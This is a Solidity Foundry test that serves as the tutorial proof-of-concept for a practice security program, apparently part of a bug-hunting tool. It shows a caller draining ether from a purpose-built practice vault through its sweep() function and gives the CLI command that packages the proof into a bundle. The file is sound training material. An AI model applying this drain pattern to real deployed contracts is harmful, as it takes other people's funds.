// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// TUTORIAL TARGET — the practice program's public proof (docs/practice.md), written as a forge test.
// `antibody from-forge` turns it into a bundle (docs/foundry.md). Forked at the practice program's anchor:
//
//   PRACTICE_FACTORY=<factory> antibody from-forge --project contracts/evm --contract PracticeForgePoc \
//     --test test_sweepMyVault --fork-url <rpc> --fork-block <anchor> --out sweep.bundle.json
//
// Without a fork it runs on a local copy (the bundle then names that copy's vault).

import {PracticeFactory, PracticeVault} from "../../src/practice/Practice.sol";

interface Vm {
    function envOr(string calldata, address) external view returns (address);
    function deal(address, uint256) external;
    function prank(address, address) external;
}

contract PracticeForgePoc {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    PracticeFactory factory;

    function setUp() public {
        address f = vm.envOr("PRACTICE_FACTORY", address(0));
        factory = f == address(0) ? new PracticeFactory{value: 24 ether}(24) : PracticeFactory(f);
    }

    /// The tutorial proof as a hunter would write it: one call, as their own sender, to vault 3.
    function test_sweepMyVault() public {
        address me = address(0xA11CE);
        vm.deal(me, 0.01 ether);
        vm.prank(me, me);
        PracticeVault(payable(factory.vaultAt(3))).sweep(payable(me));
        require(me.balance > 0.01 ether, "the vault's ether reached me");
    }
}
